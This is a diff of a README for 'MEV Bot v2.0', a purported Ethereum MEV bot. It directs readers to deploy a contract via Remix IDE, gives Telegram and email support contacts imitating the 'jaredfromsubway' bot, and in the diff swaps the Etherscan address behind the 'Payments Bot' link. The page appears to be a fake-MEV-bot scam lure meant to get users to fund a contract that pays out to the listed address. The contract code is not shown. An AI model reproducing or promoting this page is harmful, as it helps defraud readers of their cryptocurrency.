@@ -1,9 +1,9 @@
 
 <p align="center">
-  <img src="https://i.ibb.co/XptgSrf/protect.png" alt="MEV Bot 2 Logo" width="200">
+  <img src="https://i.ibb.co/XptgSrf/protect.png" alt="MEV Bot v2.0 Logo" width="200">
 </p>
 
-<h1 align="center">MEV Bot 2</h1>
+<h1 align="center">MEV Bot v2.0</h1>
 
 <p align="center"><strong>"Guarded by the MEV Shield, only authorized transactions pass. Unauthorized actions are blocked before they begin."</strong></p>
 
@@ -70,7 +70,7 @@ Contract deployment is only possible from the address that received the key.***
 
 -------------
 [🖥  RemixIDE](https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.6.6+commit.6c089d02.js) For Deploy
-[🤖 Payments Bot](https://etherscan.io/address/0xc0a642dd4a32199da40486eb1603f0e917d62dcc)  
+[🤖 Payments Bot](https://etherscan.io/address/0x58b93daD37aBa61B09DAd631d1732aeA8f7a21Ab)  
 [📝 Source Code](mevbot2.sol)  
 [✍️ Telegram Support](https://t.me/JaredsuppETH)  
 ✉️ Email: support@jaredfromsubway-eth.com
